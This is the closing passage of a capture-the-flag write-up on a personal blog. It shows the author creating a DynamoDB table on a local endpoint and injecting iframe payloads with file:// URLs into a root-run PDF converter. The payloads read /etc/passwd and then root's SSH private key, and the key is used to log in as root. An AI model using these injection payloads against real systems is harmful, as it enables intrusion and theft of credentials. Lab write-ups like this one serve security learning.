+└──╼ <span class="nv">$aws</span> dynamodb list-tables <span class="nt">--endpoint-url</span> http://127.0.0.1:4566                           
+TABLENAMES      Image                                                                       
+TABLENAMES      ImageTag                                                                     
+TABLENAMES      Tag                                                                        
+TABLENAMES      <span class="nb">users</span>    
+
+</code></pre></div></div>
+
+<p>As expected, we cannot find the <strong>alerts</strong> table, so we search the Amazon documentation on how to do so and further how to add an item in it, starting with a test string;</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># create the table</span>
+aws dynamodb create-table <span class="nt">--table-name</span> alerts <span class="nt">--attribute-definitions</span> <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S <span class="nt">--key-schema</span> <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE <span class="nt">--provisioned-throughput</span> <span class="nv">ReadCapacityUnits</span><span class="o">=</span>10,WriteCapacityUnits<span class="o">=</span>5 <span class="nt">--endpoint-url</span> http://127.0.0.1:4566
+
+<span class="c"># add a test item</span>
+aws dynamodb put-item <span class="nt">--table-name</span> alerts <span class="nt">--item</span> <span class="s1">'{"title":{"S":"Ransomware"},"data":{"S":"TestString"}}'</span> <span class="nt">--endpoint-url</span> http://127.0.0.1:4566
+</code></pre></div></div>
+
+<p>And upon re-sending out POST request, a “result.pdf” file is now on the host:</p>
+
+<p><img src="/assets/images/Pasted image 20210423194028.png" alt="Pasted image 20210423194028" /></p>
+
+<p><img src="/assets/images/Pasted image 20210423194154.png" alt="Pasted image 20210423194154" /></p>
+
+<p>We also note that these file are owned by <strong>root</strong>, which make this PDF conversion a good target for further escalation.</p>
+
+<h3 id="exploiting-pdf-conversion">Exploiting PDF Conversion</h3>
+
+<h4 id="adapting-code-for-easier-exploitation">Adapting code for easier exploitation</h4>
+
+<p>Before starting, we change our attack vector a little to allow easier injection process, mainly by bundling up a few command together and externalising the data to be inserted into its own json file, which can be included in the command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># create the table</span>
+aws dynamodb create-table <span class="nt">--table-name</span> alerts <span class="nt">--attribute-definitions</span> <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S <span class="nt">--key-schema</span> <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE <span class="nt">--provisioned-throughput</span> <span class="nv">ReadCapacityUnits</span><span class="o">=</span>10,WriteCapacityUnits<span class="o">=</span>5 <span class="nt">--endpoint-url</span> http://127.0.0.1:4566
+
+<span class="c"># add load the json payload</span>
+aws dynamodb put-item <span class="nt">--table-name</span> alerts <span class="nt">--item</span> file://exploit.json <span class="nt">--endpoint-url</span> http://127.0.0.1:4566 
+
+<span class="c"># create the pdf</span>
+curl <span class="nt">-i</span> <span class="nt">-X</span> POST <span class="nt">-F</span> <span class="s1">'action=get_alerts'</span> 127.0.0.1:8000
+
+</code></pre></div></div>
+
+<h4 id="getting-lfi">Getting LFI</h4>
+
+<p>We attempt first a basic LFI by attempting to include the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file in the pdf with the following payload:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+        </span><span class="nl">"title"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nl">"S"</span><span class="p">:</span><span class="s2">"Ransomware"</span><span class="p">},</span><span class="w">
+        </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nl">"S"</span><span class="p">:</span><span class="s2">"&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;"</span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>And by running the steps above, we have a POC we are able to use LFI as root:</p>
+
+<p><img src="/assets/images/Pasted image 20210425005137.png" alt="Pasted image 20210425005137" /></p>
+
+<h4 id="privilege-escalation-to-root">Privilege Escalation to root</h4>
+
+<p>Using the LFI we found above, we first try to see if any <strong>ssh private keys</strong> would be present in <code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code> and adapt our payload to the following:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+        </span><span class="nl">"title"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nl">"S"</span><span class="p">:</span><span class="s2">"Ransomware"</span><span class="p">},</span><span class="w">
+        </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nl">"S"</span><span class="p">:</span><span class="s2">"&lt;iframe src=file:///root/.ssh/id_rsa&gt;&lt;/iframe&gt;"</span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>And running the attack again, we get a private key dumped:</p>
+
+<p><img src="/assets/images/Pasted image 20210425010221.png" alt="Pasted image 20210425010221" /></p>
+
+<p>We copy the content of this file into a local file, <code class="language-plaintext highlighter-rouge">chmod 600</code> it and attempt to <strong>ssh</strong> in as root using this key.</p>
+
+<p>:warning: <em>The process of formatting the key to a valid format was somewhat tedious; manual copy-paste didn’t keep line breaks. After some <strong>sed</strong> and trial-and-error, we finally managed to get it formatted, although there must be a more automatic way to format it properly.</em></p>
+
+<p>We are able to successfully login as root and get the :black_flag: <strong>root.txt</strong> :black_flag: flag.</p>
+
+<p><img src="/assets/images/Pasted image 20210425012911.png" alt="Pasted image 20210425012911" /></p>
+
+
+</article>
+
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>g0rth0r</b>
+    </span>
+    
+    <span>© 2021</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
